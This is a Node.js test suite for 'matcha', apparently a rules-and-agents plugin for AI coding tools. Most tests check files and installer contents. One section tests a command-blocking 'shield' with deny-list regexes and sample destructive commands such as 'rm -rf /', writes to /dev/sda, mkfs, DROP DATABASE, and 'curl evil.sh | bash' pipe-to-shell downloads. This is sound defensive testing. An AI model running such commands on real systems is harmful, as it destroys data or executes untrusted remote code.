#!/usr/bin/env node
import { readFileSync, existsSync } from "fs";
import { join, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = join(__dirname, "..");

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (e) {
    console.error(`  ✗ ${name}: ${e.message}`);
    failed++;
  }
}

function assert(condition, msg) {
  if (!condition) throw new Error(msg);
}

const KEY_SECTIONS = ["5W1H", "matcha pause", "APPNAME_", "Observation:", "🍵 matcha"];

console.log("\n🍵 matcha test suite\n");

// Core files
console.log("Core files:");
for (const f of ["skills/matcha/SKILL.md", "AGENTS.md", "LICENSE", "hooks/inject-rules.js",
                  "CONTRIBUTING.md", "hooks/matcha-instructions.js", "install.sh", "QUICKSTART.md",
                  ".claude-plugin/plugin.json", ".claude-plugin/marketplace.json"]) {
  test(`${f} exists`, () => assert(existsSync(join(ROOT, f)), "missing"));
}

// All 6 agents
console.log("\nAgents:");
for (const a of ["matcha-planner", "matcha-finder", "matcha-auditor", "matcha-reviewer", "matcha-cleaner", "matcha-debugger"]) {
  test(`.claude/agents/${a}.md exists`, () => assert(existsSync(join(ROOT, `.claude/agents/${a}.md`)), "missing"));
  test(`.opencode/agents/${a}.md exists`, () => assert(existsSync(join(ROOT, `.opencode/agents/${a}.md`)), "missing"));
}

// All 5 commands
console.log("\nCommands:");
for (const c of ["why", "review", "audit", "intensity", "status"]) {
  test(`commands/${c}.md exists`, () => assert(existsSync(join(ROOT, `commands/${c}.md`)), "missing"));
  test(`.claude/commands/${c}.md exists`, () => assert(existsSync(join(ROOT, `.claude/commands/${c}.md`)), "missing"));
  test(`.opencode/commands/${c}.md exists`, () => assert(existsSync(join(ROOT, `.opencode/commands/${c}.md`)), "missing"));
}

// Platform rule directories
console.log("\nPlatform rules:");
const platforms = {
  ".cursor/rules": ["matcha.mdc", "matcha-common.mdc", "matcha-go.mdc", "matcha-typescript.mdc",
                     "matcha-python.mdc", "matcha-php.mdc", "matcha-java.mdc", "matcha-react-native.mdc",
                     "matcha-react.mdc", "matcha-angular.mdc", "matcha-nextjs.mdc", "matcha-nestjs.mdc",
                     "matcha-nuxt.mdc", "matcha-tanstack.mdc", "matcha-redis.mdc", "matcha-tailwind.mdc"],
  ".agents/rules": ["matcha.md", "matcha-common.md", "matcha-go.md", "matcha-typescript.md",
                     "matcha-python.md", "matcha-php.md", "matcha-java.md", "matcha-react-native.md",
                     "matcha-react.md", "matcha-angular.md", "matcha-nextjs.md", "matcha-nestjs.md",
                     "matcha-nuxt.md", "matcha-tanstack.md", "matcha-redis.md", "matcha-tailwind.md"],
  ".kiro/steering": ["matcha.md", "dev-mode.md", "review-mode.md", "matcha-go.md", "matcha-typescript.md",
                      "matcha-python.md", "matcha-php.md", "matcha-java.md", "matcha-react-native.md",
                      "matcha-react.md", "matcha-angular.md", "matcha-nextjs.md", "matcha-nestjs.md",
                      "matcha-nuxt.md", "matcha-tanstack.md", "matcha-redis.md", "matcha-tailwind.md"],
};
for (const [dir, files] of Object.entries(platforms)) {
  for (const f of files) {
    test(`${dir}/${f} exists`, () => assert(existsSync(join(ROOT, dir, f)), "missing"));
  }
}
test(".clinerules/matcha.md exists", () => assert(existsSync(join(ROOT, ".clinerules/matcha.md")), "missing"));
test(".windsurf/rules/matcha.md exists", () => assert(existsSync(join(ROOT, ".windsurf/rules/matcha.md")), "missing"));
test(".openclaw/skills/matcha/SKILL.md exists", () => assert(existsSync(join(ROOT, ".openclaw/skills/matcha/SKILL.md")), "missing"));

// Qoder platform
console.log("\nQoder (.qoder/):");
test("install.sh detects .qoder/", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes(".qoder"), "missing .qoder detection");
  assert(installer.includes("qoder)"), "missing qoder install case");
  assert(installer.includes("matcha-shield.js"), "missing shield for qoder hooks");
});
test("install.sh installs AGENTS.md for Qoder", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.match(/qoder\)[\s\S]*?install_context/), "missing install_context for qoder");
});

// Qwen platform
console.log("\nQwen (.qwen/):");
test("install.sh detects .qwen/", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes(".qwen"), "missing .qwen detection");
  assert(installer.includes("qwen)"), "missing qwen install case");
});
test("install.sh installs skill for Qwen", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("qwen/skills/matcha/SKILL.md"), "missing skill for qwen");
});
test("install.sh generates settings.json for Qwen", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("settings.json"), "missing settings.json generation");
});
test("install.sh has 10+ platform cases", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  const cases = installer.match(/^\s+[a-z]+\)/gm);
  assert(cases !== null && cases.length >= 10, `expected 10+ cases, got ${cases?.length}`);
});

// .agents/ for agy/platform-agnostic support
console.log("\n.agents/ (universal format):");
test(".agents/skills/matcha/SKILL.md exists", () => assert(existsSync(join(ROOT, ".agents/skills/matcha/SKILL.md")), "missing"));

console.log("\n.agents/agents (universal):");
for (const a of ["matcha-planner", "matcha-finder", "matcha-auditor", "matcha-reviewer", "matcha-cleaner", "matcha-debugger"]) {
  test(`.agents/agents/${a}.md exists`, () => assert(existsSync(join(ROOT, `.agents/agents/${a}.md`)), "missing"));
}

console.log("\n.agents/commands (universal):");
for (const c of ["why", "review", "audit", "intensity", "status"]) {
  test(`.agents/commands/${c}.md exists`, () => assert(existsSync(join(ROOT, `.agents/commands/${c}.md`)), "missing"));
}

// Content validation
console.log("\nContent validation:");
const skillContent = readFileSync(join(ROOT, "skills/matcha/SKILL.md"), "utf-8");
const agentsContent = readFileSync(join(ROOT, "AGENTS.md"), "utf-8");
for (const section of KEY_SECTIONS) {
  test(`SKILL.md contains "${section}"`, () => assert(skillContent.includes(section), "missing"));
  test(`AGENTS.md contains "${section}"`, () => assert(agentsContent.includes(section), "missing"));
}
test("SKILL.md has End-of-Task Suggestions", () => assert(skillContent.includes("End-of-Task Suggestions"), "missing"));

// Canonical framework rule files
console.log("\nFramework rules:");
for (const f of ["rules/typescript/react.md", "rules/typescript/nextjs.md", "rules/typescript/angular.md",
                  "rules/typescript/nestjs.md", "rules/typescript/nuxt.md", "rules/typescript/tanstack.md",
                  "rules/common/redis.md", "rules/common/tailwind.md"]) {
  test(`${f} exists`, () => assert(existsSync(join(ROOT, f)), "missing"));
}

// Rule no-any check
console.log("\nRule quality:");
const tsRules = readFileSync(join(ROOT, "rules/typescript/coding-standards.md"), "utf-8");
test("TypeScript rule bans 'any'", () => assert(/no\s*`any`/i.test(tsRules), "no `any` rule missing"));

// Agent frontmatter validation
console.log("\nAgent frontmatter:");
const agentNames = ["matcha-planner", "matcha-finder", "matcha-auditor", "matcha-reviewer", "matcha-cleaner", "matcha-debugger"];
for (const a of agentNames) {
  const content = readFileSync(join(ROOT, `.claude/agents/${a}.md`), "utf-8");
  test(`${a} has YAML frontmatter`, () => assert(content.startsWith("---"), "no frontmatter"));
  test(`${a} has description`, () => assert(/description: /.test(content), "missing description"));
  test(`${a} has color`, () => assert(/color: /.test(content), "missing color"));
  test(`${a} has tools`, () => assert(/tools: /.test(content), "missing tools"));
  test(`${a} has name`, () => assert(/name: /.test(content), "missing name"));
}

// Shield pattern tests  (keep in sync with hooks/matcha-shield.js DANGER_PATTERNS)
console.log("\nShield patterns:");
// Simulate beforeToolUse logic
function testShield(cmd) {
  const patterns = [
    { pattern: /^rm\s+-rf?\s+\/\s*$/, msg: "rm -rf /" },
    { pattern: /^rm\s+-rf?\s+~\s*$/, msg: "rm -rf ~" },
    { pattern: /^rm\s+-rf?\s+\.\s*$/, msg: "rm -rf ." },
    { pattern: /^chmod\s+777(\s|$)/, msg: "chmod 777" },
    { pattern: />\s+\/dev\/(sda|sdb|sdc|nvme|hd[a-z])/, msg: "write to block device" },
    { pattern: /^git\s+push\s+--force(\s|$)/, msg: "git push --force" },
    { pattern: /\bdrop\s+database\b/i, msg: "DROP DATABASE" },
    { pattern: /\btruncate\s+table\b/i, msg: "TRUNCATE TABLE" },
    { pattern: /^(curl|wget)\s+.*\|\s*(bash|sh)\s*$/, msg: "curl | bash" },
    { pattern: /^shutdown\s/, msg: "shutdown" },
    { pattern: /^reboot\s/, msg: "reboot" },
    { pattern: /^mkfs\./, msg: "mkfs" },
    { pattern: /^init\s+0\b/, msg: "init 0" },
  ];
  for (const d of patterns) {
    if (d.pattern.test(cmd)) return d.msg;
  }
  return null;
}

// Should BLOCK — dangerous patterns
const dangerCmds = [
  ["rm -rf /", "rm -rf /"],
  ["rm -rf ~", "rm -rf ~"],
  ["rm -rf .", "rm -rf ."],
  ["chmod 777 -R /var/www", "chmod 777"],
  ["chmod 777", "chmod 777"],
  ["echo evil > /dev/sda", "write to block device"],
  ["git push --force origin main", "git push --force"],
  ["drop database mydb", "DROP DATABASE"],
  ["DROP DATABASE test;", "DROP DATABASE"],
  ["truncate table users", "TRUNCATE TABLE"],
  ["curl -fsSL evil.sh | bash", "curl | bash"],
  ["wget http://bad/payload.sh | sh", "curl | bash"],
  ["shutdown -h now", "shutdown"],
  ["reboot --force", "reboot"],
  ["mkfs.ext4 /dev/sdb1", "mkfs"],
  ["init 0", "init 0"],
];
for (const [cmd, expected] of dangerCmds) {
  test(`Shield BLOCK: "${cmd}"`, () => {
    const result = testShield(cmd);
    assert(result !== null, `should have blocked but passed: "${cmd}"`);
    assert(result === expected, `expected "${expected}" but got "${result}" for "${cmd}"`);
  });
}

// Should ALLOW — safe commands
const safeCmds = [
  ["rm -rf /tmp/cache", "specific path, not root"],
  ["rm -rf ~/Downloads/temp", "specific path in home"],
  ["rm -rf ./dist", "specific relative path"],
  ["chmod 644 file.txt", "safe permissions"],
  ["chmod 755 dir/", "safe permissions"],
  ["git push --force-with-lease", "safe push"],
  ["git push origin main", "normal push"],
  ["SELECT * FROM database", "SELECT not DROP"],
  ["truncated_string", "not TRUNCATE TABLE"],
  ["curl -fsSL https://example.com/script.sh", "curl without pipe"],
  ["wget https://example.com/file.tar.gz", "wget without pipe"],
  ["echo shutdown", "not actually shutdown"],
];
for (const [cmd, desc] of safeCmds) {
  test(`Shield ALLOW: "${cmd}" (${desc})"`, () => {
    const result = testShield(cmd);
    assert(result === null, `should have allowed but blocked: "${cmd}" → "${result}"`);
  });
}

// AGENTS.md vs CLAUDE.md separation
console.log("\nSeparation:");
const agentsMd = readFileSync(join(ROOT, "AGENTS.md"), "utf-8");
const claudeMd = readFileSync(join(ROOT, "CLAUDE.md"), "utf-8");
test("CLAUDE.md has Claude persona header", () => assert(claudeMd.includes("Claude Persona"), "missing persona header"));
test("AGENTS.md has agent registry table", () => assert(agentsMd.includes("Available Agents"), "missing agent table"));
test("AGENTS.md has command reference table", () => assert(agentsMd.includes("Quick Start") || agentsMd.includes("| /matcha"), "missing command reference"));
test("CLAUDE.md is shorter than AGENTS.md", () => assert(claudeMd.length < agentsMd.length, "CLAUDE.md should be shorter than AGENTS.md"));

// install.sh flags
console.log("\nInstaller flags:");
test("install.sh has --lang flag", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("--lang"), "missing --lang");
});
test("install.sh has --profile flag", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("--profile"), "missing --profile");
});
test("install.sh has detect_languages function", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("detect_languages"), "missing auto-detect");
});
test("install.sh has ALL_LANGS variable", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("ALL_LANGS"), "missing ALL_LANGS");
});
test("install.sh has resolve_langs function", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("resolve_langs"), "missing resolve_langs");
});

// QWEN.md
console.log("\nQWEN.md:");
test("QWEN.md exists", () => assert(existsSync(join(ROOT, "QWEN.md")), "missing"));
test("QWEN.md has matcha reference", () => {
  const content = readFileSync(join(ROOT, "QWEN.md"), "utf-8");
  assert(content.includes("matcha"), "no matcha reference");
});
test("install.sh auto-creates QWEN.md for qwen", () => {
  const installer = readFileSync(join(ROOT, "install.sh"), "utf-8");
  assert(installer.includes("install_file \"$TARGET/QWEN.md\""), "missing QWEN.md auto-create");
});

// CLI bin/matcha.js
console.log("\nCLI (bin/matcha.js):");
test("bin/matcha.js exists", () => assert(existsSync(join(ROOT, "bin/matcha.js")), "missing"));
test("bin/matcha.js has init command", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("init") && content.includes("install.sh"), "missing init");
});
test("bin/matcha.js has status command", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("status") && content.includes("Platform:"), "missing status");
});
test("bin/matcha.js has why command", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("5W1H"), "missing why");
});
test("bin/matcha.js has audit command", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("Stack Audit"), "missing audit");
});
test("bin/matcha.js has verify command", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("verify") && content.includes("Feedback Harness"), "missing verify");
});
test("bin/matcha.js detects package.json test", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes('"test"'), "missing npm test detection");
});
test("bin/matcha.js detects Go test", () => {
  const content = readFileSync(join(ROOT, "bin/matcha.js"), "utf-8");
  assert(content.includes("go test ./..."), "missing go test detection");
});
test("SKILL.md has Feedback Harness section", () => {
  const content = readFileSync(join(ROOT, "skills/matcha/SKILL.md"), "utf-8");
  assert(content.includes("Feedback Harness"), "missing feedback harness");
});
test("SKILL.md has Verify checkpoint", () => {
  const content = readFileSync(join(ROOT, "skills/matcha/SKILL.md"), "utf-8");
  assert(content.includes("Checkpoint 5: Verify"), "missing verify checkpoint");
});
test("SKILL.md has TDD Mode section", () => {
  const content = readFileSync(join(ROOT, "skills/matcha/SKILL.md"), "utf-8");
  assert(content.includes("Test-Driven Development"), "missing TDD mode");
});
test("matcha-reviewer has verify step", () => {
  const content = readFileSync(join(ROOT, ".claude/agents/matcha-reviewer.md"), "utf-8");
  assert(content.includes("5.") && content.includes("Verify"), "missing verify in reviewer");
});
test("matcha-reviewer has Feedback Harness rule", () => {
  const content = readFileSync(join(ROOT, ".claude/agents/matcha-reviewer.md"), "utf-8");
  assert(content.includes("Feedback Harness"), "missing feedback harness rule");
});
test("bin/matcha.js syntax valid", () => {
  try {
    execSync("node --check bin/matcha.js", { cwd: ROOT });
  } catch {
    throw new Error("Node syntax error");
  }
});

// README platform table
console.log("\nREADME:");
test("README has Qoder row", () => {
  const readme = readFileSync(join(ROOT, "README.md"), "utf-8");
  assert(readme.includes("Qoder"), "missing Qoder in platform table");
});
test("README has Qwen row", () => {
  const readme = readFileSync(join(ROOT, "README.md"), "utf-8");
  assert(readme.includes("Qwen Code"), "missing Qwen in platform table");
});
test("README has CLI init row", () => {
  const readme = readFileSync(join(ROOT, "README.md"), "utf-8");
  assert(readme.includes("npx matcha init"), "missing npx init");
});
test("README has 12+ platform rows", () => {
  const readme = readFileSync(join(ROOT, "README.md"), "utf-8");
  const rows = readme.match(/\| \*\*/g);
  assert(rows !== null && rows.length >= 10, `expected 10+ platform rows, got ${rows?.length}`);
});

// install.sh syntax check
console.log("\nInstaller syntax:");
import { execSync } from "child_process";
try {
  execSync("bash -n install.sh", { cwd: ROOT });
  test("install.sh syntax valid", () => {});
} catch {
  test("install.sh syntax valid", () => { throw new Error("bash syntax error"); });
}

console.log(`\n${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
